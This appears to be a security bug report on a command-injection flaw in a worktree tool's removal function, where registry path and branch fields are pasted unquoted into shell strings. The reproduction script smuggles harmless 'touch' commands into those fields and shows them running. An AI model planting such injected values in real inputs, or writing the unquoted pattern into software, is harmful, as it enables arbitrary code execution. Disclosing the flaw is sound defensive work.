---
name: "Worktree remove executes shell commands embedded in registry path and branch fields"
---

# Worktree remove executes shell commands embedded in registry path and branch fields

## Summary

`removeWorktree()` loads `path` and `branch` values from its YAML registry and concatenates them into shell command strings without quoting or argv separation. A tampered registry entry therefore causes arbitrary shell commands to run during worktree removal.

## Reproduction

From the repository root, create a disposable repository and a registry entry whose stored path and branch append harmless `touch` commands, then invoke removal with a shell-backed `exec` dependency:

```sh
repo=$PWD
probe=$(mktemp -d)
mkdir -p "$probe/repo"
(
  cd "$probe/repo"
  git init -q -b main
  git config user.email probe@example.invalid
  git config user.name Probe
  printf x > a
  git add a
  git commit -q -m init
)

cat > "$probe/repro.mts" <<EOF
import { execSync } from "node:child_process";
import { mkdir, readFile, writeFile } from "node:fs/promises";
import { removeWorktree } from "file://$PWD/packages/worktree/src/remove.ts";

await writeFile("$probe/registry.yaml", `worktrees:\n  - name: victim\n    path: 'missing; touch "$probe/removed-injected"; #'\n    branch: 'poe-code/victim; touch "$probe/branch-injected"; #'\n    baseBranch: main\n    createdAt: now\n    source: probe\n    agent: codex\n    status: active\n`);
await removeWorktree({
  cwd: "$probe/repo",
  name: "victim",
  registryFile: "$probe/registry.yaml",
  deleteBranch: true,
  deps: {
    fs: { mkdir, readFile, writeFile },
    async exec(command) {
      console.log(command);
      execSync(command, { cwd: "$probe/repo", stdio: "ignore", shell: "/bin/sh" });
      return { stdout: "", stderr: "" };
    }
  }
});
EOF

"$repo/node_modules/.bin/tsx" "$probe/repro.mts" || true
ls -l "$probe/removed-injected" "$probe/branch-injected"

nl -ba packages/worktree/src/remove.ts | sed -n '12,32p'
nl -ba packages/worktree/src/registry.ts | sed -n '10,20p'
```

## Observed Behavior

The registry-sourced values become executable shell syntax and both marker files are created:

```text
git worktree remove missing; touch "<probe>/removed-injected"; #
git branch -D poe-code/victim; touch "<probe>/branch-injected"; #
<probe>/removed-injected exists
<probe>/branch-injected exists
```

## Expected Behavior

Registry path and branch fields must be treated as data and passed to Git as safely separated arguments. Tampered stored values must not be interpreted as shell commands.

## Impact

Modifying the worktree registry or importing untrusted registry state can lead to arbitrary shell execution when a user cleans up a named worktree, turning routine cleanup into code execution.
